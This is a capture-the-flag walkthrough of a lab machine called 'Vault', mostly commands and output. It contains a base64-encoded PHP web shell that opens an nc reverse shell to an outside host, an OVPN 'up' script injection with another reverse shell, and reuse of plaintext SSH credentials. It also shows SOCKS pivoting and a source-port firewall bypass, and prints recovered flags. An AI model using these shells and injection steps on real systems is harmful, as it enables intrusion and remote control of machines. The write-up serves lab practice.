# Vault (User/Root Compromise)
- Target IP: 10.129.11.198

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 22,80 TCP open
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# Nada
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt --url http://10.129.11.198/

# Output
# /index.php
```

# Web
```
Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction) 
```
- Added Sparklays.com -> `/etc/hosts/

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt --url http://sparklays.com/

# Output
# /index.php
```

- http://sparklays.com/sparklays 
- http://sparklays.com/sparklays/admin.php
- http://sparklays.com/sparklays/design/design.html -> http://sparklays.com/sparklays/design/changelogo.php
- Using https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/file-extensions-lower-case.txt during file uploads
  - Identified successful uploads with .php5
  - Uploaded PHP shell
```php
<?php shell_exec(base64_decode("cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuMTczIDQ0MyA+L3RtcC9mCg==")); ?>
```

# As www-data
```bash
www-data@ubuntu:/home/dave/Desktop$ cat ssh
cat ssh
dave
Dav3therav3123
```

```bash
nxc ssh 10.129.11.198 -u 'dave' -p 'Dav3therav3123'
SSH         10.129.11.198   22     10.129.11.198    [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
SSH         10.129.11.198   22     10.129.11.198    [+] dave:Dav3therav3123  Linux - Shell access!
```

```bash
dave@ubuntu:~/Desktop$ cat Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
```

```bash
for ip in $(seq 0 255); do
    ping -c 1 192.168.122.$ip | grep "bytes from" &
done
```

```bash
dave@ubuntu:~/Desktop$ bash scan.sh 
Do you want to ping broadcast? Then -b
64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.033 ms
64 bytes from 192.168.122.5: icmp_seq=1 ttl=64 time=0.301 ms
64 bytes from 192.168.122.4: icmp_seq=1 ttl=64 time=0.429 ms
```

```bash
ssh -D 9050 dave@10.129.11.198
```

```bash
time for i in $(seq 1 65535); do (proxychains -q nc -zvn 192.168.122.4 ${i} 2>&1 | grep -v "Connection refused" &); done
# (UNKNOWN) [192.168.122.4] 22 (ssh) open : Operation now in progress
# (UNKNOWN) [192.168.122.4] 80 (http) open : Operation now in progress
```

- Attach the socks proxy with Burpsuite
  - `/dns-config.php` -> 404
  - `/vpnconfig.php` ->  VPN Configurator (Modify OVPN files)

- `/vpnconfig.php` has functionality to test the VPN file as well

## OVPN Command Execution
- Remote: Firewall IP address
- ifconfig: Random 10.0.0.0/24 addresses
```
remote 192.168.122.1
ifconfig 10.0.0.2 10.0.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8443 >/tmp/f'"
nobind
```

```bash
root@DNS:/home/dave# cat user.txt
cat user.txt
a4947faa8d4e1f80771d34234bd88c73
```

```bash
root@DNS:/home/alex# cat .bash_history

# Output
# ping 192.168.5.2
```

```bash
dave@ubuntu:~$ ssh dave@192.168.122.4
dave@192.168.122.4's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

98 packages can be updated.
50 updates are security updates.


Last login: Mon Sep  3 16:38:03 2018
```

```bash
time for i in $(seq 1 65535); do (nc -zvn 192.168.5.2 ${i} 2>&1 | grep -v "Connection refused" &); done
```

```bash
grep -rHa '192.168.5.2' /var/log

# Output
# /var/log/auth.log:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
# /var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
# /var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
# /var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
# /var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

```bash
root@DNS:/# /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f -p987

Starting Nmap 7.01 ( https://nmap.org ) at 2025-12-03 12:17 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0024s latency).
PORT    STATE SERVICE
987/tcp open  unknown
```
- Good resource: https://nmap.org/book/firewall-subversion.html

```bash
ncat 192.168.5.2 987 -p 4444
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```
- Uses ncat to hit ip:port using 4444 as the source port (Like we did with nmap)

```bash
/usr/bin/ncat -l 3333 --sh-exec 'ncat 192.168.5.2 987 -p 4444'
```
```bash
ssh dave@127.0.0.1 -p3333

dave@vault:~$ hostname
vault

dave@vault:~$ ls
root.txt.gpg

dave@vault:~$ gpg -d root.txt.gpg
gpg -d root.txt.gpg
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
```

```bash
dave@ubuntu:~/Desktop$ cat key
itscominghome
```

```bash
dave@vault:~$ base64
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

dave@vault:~$ base32 root.txt.gpg | tr -d '\n'
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=
```

```bash
dave@ubuntu:~/Desktop$ gpg -d root.txt.gpg 

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
ca468370b91d1f5906e31093d9bfe819
```